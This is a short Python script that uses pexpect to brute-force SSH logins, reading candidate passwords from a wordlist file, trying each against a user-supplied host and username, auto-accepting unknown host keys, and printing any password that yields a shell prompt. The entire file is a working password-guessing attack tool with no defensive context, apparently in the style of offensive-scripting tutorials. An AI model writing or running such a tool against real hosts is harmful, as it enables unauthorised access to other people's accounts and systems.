#!/usr/bin/python

import pexpect

PROMPT = ["# ", ">>> ", "> ", "\$ "]


def connect(user, host, pwd):
    ssh_new_key = "Are you sure you want to continue connecting"
    conn_str = f"ssh {user}@{host}"
    child = pexpect.spawn(conn_str)
    res = child.expect([pexpect.TIMEOUT, ssh_new_key, "[P|p]assword: "])
    if res == 0:
        print("!! Error connecting")
        return
    if res == 1:
        child.sendline("yes")
        res = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
        if res == 0:
            print("!! Error connecting")
            return
    child.sendline(pwd)
    child.expect(PROMPT, timeout=0.5)
    return child


if __name__ == "__main__":
    host = input("! Enter ip/hostname: ")
    user = input("! ENter unsername: ")
    file = open("ssh_passwords.txt", "r")
    for password in file.readlines():
        password = password.strip("\n")
        try:
            child = connect(user, host, password)
            print(f"<> PASSWORD FOUND {password}")
        except:
            print(f"! Checking password {password}... no")
